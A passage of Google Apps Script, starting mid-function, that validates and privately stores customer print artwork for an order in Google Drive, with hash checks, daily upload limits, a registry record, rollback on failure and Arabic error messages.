  if(PropertiesService.getScriptProperties().getProperty('ART_RETENTION_POLICY')!=='READY_72H_PERMANENT_V1')throw new Error('سياسة حفظ التصميمات غير مفعّلة؛ أعد المحاولة بعد تحديث المصنع');
  if(artExpired_(b.orderId))throw new Error('انتهت مدة حفظ تصميمات هذا الطلب؛ لا يمكن إعادة رفعها لنفس الطلب');
  if(!artOrderValid_(b.orderId)||!artRefValid_(b.ref)||!/^[a-f0-9]{64}$/.test(String(b.key||'')))throw new Error('بيانات إرفاق الطباعة غير صالحة');
  var original=artDecode_(b.data,5*1024*1024),preview=artDecode_(b.thumb,1024*1024);
  var hash=artHex_(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256,original.bytes));
  var prior=artFind_(b.orderId,b.ref,true);
  if(prior){if(!artEqual_(prior[4],b.key)||!artEqual_(prior[5],hash))throw new Error('مرجع الطباعة مستخدم بتصميم مختلف');return {ok:true,ready:true};}
  if(!LockService.getScriptLock().hasLock())throw Error('WRITE_LOCK_REQUIRED');
  var props=PropertiesService.getScriptProperties(),day=Utilities.formatDate(new Date(),'UTC','yyyy-MM-dd');
  var budgetKey='ART_BYTES_TODAY',countKey='ART_COUNT_TODAY';
  var sameDay=props.getProperty('ART_BUDGET_DAY')===day;
  var used=sameDay?Number(props.getProperty(budgetKey)||0):0,count=sameDay?Number(props.getProperty(countKey)||0):0,size=original.bytes.length+preview.bytes.length;
  if(used+size>200*1024*1024||count>=200)throw new Error('تم بلوغ حد رفع الصور اليومي؛ الملفات محفوظة على الجهاز');
  props.setProperty('ART_BUDGET_DAY',day);props.setProperty(budgetKey,String(used+size));props.setProperty(countKey,String(count+1));
  var folder=artPrivateFolder_(),f=null,t=null,registry=null;
  try{
    f=folder.createFile(Utilities.newBlob(original.bytes,original.mime,b.ref));
    f.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|original');
    t=folder.createFile(Utilities.newBlob(preview.bytes,preview.mime,b.ref+'_preview'));
    t.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|preview');
    if(f.getSharingAccess()!==DriveApp.Access.PRIVATE||t.getSharingAccess()!==DriveApp.Access.PRIVATE)throw new Error('تعذّر ضمان خصوصية ملف الطباعة');
    var record=[b.orderId,b.ref,f.getId(),t.getId(),b.key,hash,size,Date.now()];
    registry=folder.createFile(Utilities.newBlob(JSON.stringify(record),'application/json',artRegistryName_(b.orderId,b.ref)));
    registry.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|registry');
    if(registry.getSharingAccess()!==DriveApp.Access.PRIVATE)throw new Error('تعذّر ضمان خصوصية سجل التصميم');
  }catch(e){
    var temporary=[[registry,artRegistryName_(b.orderId,b.ref),'registry'],[t,b.ref+'_preview','preview'],[f,b.ref,'original']];
    for(var rollback=0;rollback<temporary.length;rollback++){
      var part=temporary[rollback];if(!part[0])continue;
      try{part[0].setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|'+part[2]);artPermanentlyRemove_(part[0].getId(),part[1],'WPC_ART_V1|'+b.orderId+'|'+b.ref+'|'+part[2],folder.getId());}
      catch(rollbackError){props.setProperty('ART_UPLOAD_ROLLBACK_FAILED','1');}
    }
    throw new Error('تعذّر حفظ صورة الطباعة بشكل خاص؛ أعد المحاولة');
  }
  return {ok:true,ready:true};
}
